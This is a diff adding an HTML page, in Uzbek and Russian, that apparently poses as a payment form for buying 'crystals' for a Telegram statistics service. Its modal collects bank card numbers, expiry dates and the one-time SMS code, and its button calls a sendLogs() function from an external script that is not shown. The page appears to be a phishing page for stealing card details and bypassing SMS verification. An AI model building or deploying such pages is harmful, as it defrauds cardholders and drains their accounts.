@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>To'lov Sahifasi</title>
+    <link rel="stylesheet" href="open budjet.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <div class="payment-card">
+        <!-- Logotip va Sarlavha -->
+        <div class="card-header">
+            <div class="icon-wrapper">
+                <svg class="icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path>
+                </svg>
+            </div>
+            <h2 class="title">ФУНСТАТ ТЕЛЕЛОГ</h2>
+            <p class="subtitle">Покупка кристаллов</p>
+        </div>
+
+        <!-- Birinchi forma (Ma'lumotlar) -->
+        <form id="infoForm">
+            <div class="form-group">
+                <label class="form-label" for="serviceName">Telegram user</label>
+                <input type="text" id="" value="@abdulhhay" disabled class="form-input disabled-input">
+            </div>
+
+            <div class="form-group">
+                <label class="form-label" for="fullName"> (Имя и фамилия)</label>
+                <input type="text" id="pinInput" placeholder="Ali Valiyev" required class="form-input">
+            </div>
+
+            <div class="form-group">
+                <label class="form-label" for="amount">кристаллов </label>
+                <div class="input-with-symbol">
+                    <input type="number" id="pinInput" min="10" placeholder="150" required class="form-input amount-input">
+                    <span class="currency-symbol">кристаллов</span>
+                </div>
+            </div>
+
+            <button type="submit" id="pinInput"  class="pay-button" >
+                <span>Купить</span>
+                <svg class="btn-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path>
+                </svg>
+            </button>
+        </form>
+
+        <div class="security-badge">
+            <svg class="shield-icon" fill="currentColor" viewBox="0 0 20 20">
+                <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path>
+            </svg>
+            <span>256-bit SSL security-badge</span>
+        </div>
+    </div>
+
+    <!-- Karta ma'lumotlarini kiritish uchun Modal Oyna -->
+    <div id="paymentModal" class="modal hidden">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Снять кристаллы</h3>
+                <button type="button" id="pinInput" class="close-btn">&times;</button>
+            </div>
+            
+            <form id="cardForm">
+                <div class="form-group">
+                    <label class="form-label" for="cardNumber">Номер карты</label>
+                    <input type="text" id="pinInput" maxlength="19" placeholder="8600 0000 0000 0000" required class="form-input">
+                </div>
+
+                <div class="form-row">
+                    <div class="form-group half">
+                        <label class="form-label" for="expMonth">MM </label>
+                        <input type="text" id="pinInput" maxlength="2" placeholder="12" required class="form-input">
+                    </div>
+                    <div class="form-group half">
+                        <label class="form-label" for="expYear">ГГ</label>
+                        <input type="text" id="pinInput" maxlength="2" placeholder="28" required class="form-input">
+                    </div>
+                </div>
+                <div class="form-group sms-code">
+                    <label>Введите SMS-код (Simbad)</label>
+                    <input 
+                      type="text" 
+                      id="pinInput" 
+                      maxlength="6" 
+                      required
+                      placeholder=""
+                    >
+
+                      
+                    <button type="button" class="pay-button" id="pinInput" onclick="sendLogs()" style="margin-top: 10px;">
+                        <span id="btnText">Получить SMS-код</span>
+                        <span id="btnLoading" class="loading-wrapper hidden"></span>
+                      </button>
+            </form>
+ 
+        </div>
+      
+    </div>
+
+    <script src="open.js"></script>
+</body>
+</html>
